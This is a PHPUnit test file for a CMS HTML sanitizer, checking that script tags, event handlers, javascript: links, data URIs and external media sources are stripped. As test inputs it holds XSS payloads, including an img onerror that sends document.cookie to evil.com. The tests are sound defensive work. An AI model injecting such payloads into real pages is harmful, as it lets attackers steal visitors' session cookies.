<?php

declare(strict_types=1);

namespace PaginiumCMS\Tests\Core\Security\Services;

use PaginiumCMS\Core\Security\Services\ContentSecuritySanitizer;
use PaginiumCMS\Core\Settings\Contracts\SettingsRepositoryInterface;
use PHPUnit\Framework\TestCase;

class ContentSecuritySanitizerTest extends TestCase
{
    public function testStripsScriptTagsByDefault(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
            'allowedHtmlTags' => 'p,strong,script',
        ]);

        $result = $sanitizer->sanitizeHtml('<p>ok</p><script>alert(1)</script>');

        $this->assertSame('<p>ok</p>', $result);
    }

    public function testAllowsScriptWhenConfigured(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => true,
            'allowedHtmlTags' => 'p,script',
        ]);

        $result = $sanitizer->sanitizeHtml('<p>ok</p><script>alert(1)</script>');

        $this->assertStringContainsString('<script>alert(1)</script>', $result);
    }

    public function testBypassWhenSanitizationDisabled(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => false,
        ]);

        $html = '<script>x</script>';
        $this->assertSame($html, $sanitizer->sanitizeHtml($html));
    }

    public function testStripsOnerrorFromImg(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml(
            '<img src="x" onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">'
        );

        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringContainsString('<img', $result);
    }

    public function testStripsJavascriptHrefFromAnchor(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml('<a href="javascript:alert(document.cookie)">klikni</a>');

        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringContainsString('>klikni</a>', $result);
    }

    public function testStripsDataUriFromImgSrc(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml('<img src="data:text/html,<script>alert(1)</script>">');

        $this->assertStringNotContainsString('data:', $result);
    }

    public function testPreservesTrustedMermaidFigureSvg(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
            'allowSvgInline' => false,
        ]);

        $figure = '<figure class="paginium-mermaid" role="img"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg></figure>';
        $result = $sanitizer->sanitizeHtml($figure);

        $this->assertStringContainsString('paginium-mermaid', $result);
        $this->assertStringContainsString('<svg', $result);
    }

    public function testKeepsMutedHeroVideoAttributes(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $html = '<section class="pg-hero"><video class="pg-hero-video" muted loop playsinline autoplay preload="metadata" poster="/storage/app/content/media/still.jpg"><source src="/storage/app/content/media/hero.mp4"></video></section>';
        $result = $sanitizer->sanitizeHtml($html);

        $this->assertStringContainsString('pg-hero-video', $result);
        $this->assertStringContainsString('muted', $result);
        $this->assertStringContainsString('loop', $result);
        $this->assertStringContainsString('playsinline', $result);
        $this->assertStringContainsString('poster="/storage/app/content/media/still.jpg"', $result);
        $this->assertStringContainsString('src="/storage/app/content/media/hero.mp4"', $result);
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function testStripsExternalVideoSrc(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml(
            '<video src="https://evil.example/track.mp4" controls></video>'
        );

        $this->assertStringNotContainsString('evil.example', $result);
    }

    /**
     * @param array<string, mixed> $contentSecurity
     */
    private function makeSanitizer(array $contentSecurity): ContentSecuritySanitizer
    {
        $settings = $this->createMock(SettingsRepositoryInterface::class);
        $settings->method('group')->willReturnCallback(
            static fn (string $group): array => $group === 'contentSecurity' ? $contentSecurity : []
        );

        return new ContentSecuritySanitizer($settings);
    }
}
